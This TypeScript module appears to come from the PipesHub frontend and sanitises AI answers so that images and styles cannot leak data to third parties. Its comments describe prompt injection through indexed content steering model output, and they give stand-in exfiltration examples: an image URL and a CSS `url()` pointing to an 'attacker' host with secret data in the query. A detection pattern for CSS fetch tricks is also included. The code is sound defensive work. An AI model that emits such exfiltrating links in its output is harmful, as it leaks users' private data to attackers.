import type { Root as HastRoot, RootContent as HastNode } from 'hast';
import type { Schema } from 'hast-util-sanitize';
import { UNTRUSTED_HTML_SCHEMA } from '@/lib/markdown/untrusted-html';
import { defaultUrlTransform, type UrlTransform } from 'react-markdown';
import { getApiBaseUrl } from '@/lib/utils/api-base-url';

/**
 * Which image URLs in rendered model output may load without a click.
 *
 * Model output is attacker-steerable (prompt injection through indexed
 * content), and an auto-loading `<img src="https://attacker/?d=<secret>">`
 * leaks data the moment an answer renders. Only URLs that cannot reach a third
 * party load automatically: `data:image/…`, `blob:`, and the record and
 * document paths on the app's own origin or the PipesHub API origin, which
 * take an opaque id and nothing else. Every other path there waits for a click
 * too, since a same-origin endpoint that redirects or records its query would
 * carry the data on. Everything else, including presigned S3/Azure URLs whose
 * host the browser cannot verify, waits for a click.
 */

export type ImageUrlDecision =
  | { kind: 'auto'; src: string }
  | { kind: 'click'; src: string; host: string }
  | { kind: 'blocked' };

const DATA_IMAGE_PREFIX = /^data:image\//i;
const BLOB_PREFIX = /^blob:/i;

/**
 * The server writes an outside image as `held-image:` and the percent-encoded URL, so an API or MCP client
 * that draws the answer loads nothing; this renderer shows it as a click-to-load placeholder.
 */
export const HELD_IMAGE_SCHEME = 'held-image';
const HELD_IMAGE_PREFIX = /^held-image:/i;

/** App and API paths an answer image may load from on its own: an opaque id, no query and no fragment. */
const TRUSTED_IMAGE_PATHS: readonly RegExp[] = [
  /^\/api\/v1\/knowledgeBase\/stream\/record\/[A-Za-z0-9][\w-]{0,127}$/,
  /^\/api\/v1\/document\/[A-Za-z0-9][\w-]{0,127}\/download$/,
];

function trustedOrigins(): Set<string> {
  const origins = new Set<string>();
  if (typeof window === 'undefined') return origins;
  origins.add(window.location.origin);
  const apiBase = getApiBaseUrl();
  if (apiBase) {
    try {
      origins.add(new URL(apiBase, window.location.origin).origin);
    } catch {
      // A malformed API base simply adds nothing.
    }
  }
  return origins;
}

/** The URL inside a held image, or null when the value is not one or does not decode. */
function heldImageTarget(value: string): string | null {
  if (!HELD_IMAGE_PREFIX.test(value)) return null;
  try {
    return decodeURIComponent(value.slice(HELD_IMAGE_SCHEME.length + 1));
  } catch {
    return null;
  }
}

export function classifyImageUrl(src: string | null | undefined): ImageUrlDecision {
  const raw = (src ?? '').trim();
  const held = heldImageTarget(raw);
  if (HELD_IMAGE_PREFIX.test(raw) && held === null) return { kind: 'blocked' };
  const value = (held ?? raw).trim();
  if (!value || HELD_IMAGE_PREFIX.test(value)) return { kind: 'blocked' };
  if (DATA_IMAGE_PREFIX.test(value) || BLOB_PREFIX.test(value)) {
    return { kind: 'auto', src: value };
  }
  if (typeof window === 'undefined') return { kind: 'blocked' };

  let url: URL;
  try {
    url = new URL(value, window.location.href);
  } catch {
    return { kind: 'blocked' };
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    return { kind: 'blocked' };
  }
  if (
    trustedOrigins().has(url.origin) &&
    !url.search &&
    !url.hash &&
    !/[?#]/.test(value) &&
    TRUSTED_IMAGE_PATHS.some((path) => path.test(url.pathname))
  ) {
    return { kind: 'auto', src: value };
  }
  return { kind: 'click', src: url.href, host: url.host };
}

/**
 * react-markdown's default transform empties every `data:`/`blob:` URL. Keep
 * the default for everything else and let those two schemes, and held images,
 * through for `<img src>` only, so `classifyImageUrl` sees them.
 */
export const markdownUrlTransform: UrlTransform = (url, key, node) => {
  if (
    key === 'src' &&
    node.tagName === 'img' &&
    (DATA_IMAGE_PREFIX.test(url) || BLOB_PREFIX.test(url) || HELD_IMAGE_PREFIX.test(url))
  ) {
    return url;
  }
  return defaultUrlTransform(url);
};

const NO_URL_TAGS = new Set(['picture', 'source', 'video', 'audio', 'track', 'iframe', 'embed', 'object', 'svg', 'image']);
const NO_URL_ATTRIBUTES = new Set(['srcSet', 'cite', 'longDesc', 'action', 'useMap', 'itemType', 'itemId']);

const withoutUrlAttributes = (list: NonNullable<Schema['attributes']>[string] = []) =>
  list.filter((entry) => !NO_URL_ATTRIBUTES.has(Array.isArray(entry) ? String(entry[0]) : String(entry)));

/**
 * The sanitize schema every renderer of model or document HTML starts from: the untrusted-HTML
 * schema (pipeline classes only, styles only where `rehypeSafeInlineStyle` filters them), with only
 * `<img src>` and `<a href>` left to carry a URL. `<picture>`/`<source srcset>` load an image no
 * click gates, and `srcset` is never seen by `classifyImageUrl`.
 */
export const ANSWER_HTML_SCHEMA: Schema = {
  ...UNTRUSTED_HTML_SCHEMA,
  tagNames: (UNTRUSTED_HTML_SCHEMA.tagNames ?? []).filter((tag) => !NO_URL_TAGS.has(tag)),
  attributes: Object.fromEntries(
    Object.entries(UNTRUSTED_HTML_SCHEMA.attributes ?? {})
      .filter(([tag]) => !NO_URL_TAGS.has(tag))
      .map(([tag, list]) => [tag, withoutUrlAttributes(list)]),
  ),
  protocols: {
    href: [...(UNTRUSTED_HTML_SCHEMA.protocols?.href ?? [])],
    src: [...(UNTRUSTED_HTML_SCHEMA.protocols?.src ?? []), 'data', 'blob', HELD_IMAGE_SCHEME],
  },
};

// Matched on bare words, not `url(`: a comment (`url/**/(`, `u/**/rl(`) or a CSS
// escape (`\75 rl(`) splits the token so a call-shaped pattern misses it, and
// `image()`, `image-set()` and `cross-fade()` fetch too. Any comment or
// backslash drops the style, since both can hide a fetch.
const CSS_FETCH_PATTERN = /url|image|cross-fade|element\s*\(|@import|\/\*|\\/i;

/**
 * Inline `style` is allowed on some raw-HTML elements in answers, and
 * `background: url(https://attacker/?d=…)` fetches just like an `<img>`.
 * Drop any style attribute that could make the browser fetch something.
 */
export function rehypeStripStyleUrls() {
  const walk = (node: HastRoot | HastNode): void => {
    if (node.type === 'element') {
      const style = node.properties?.style;
      if (typeof style === 'string' && CSS_FETCH_PATTERN.test(style)) {
        delete node.properties.style;
      }
    }
    if ('children' in node) node.children.forEach(walk);
  };
  return (tree: HastRoot) => walk(tree);
}
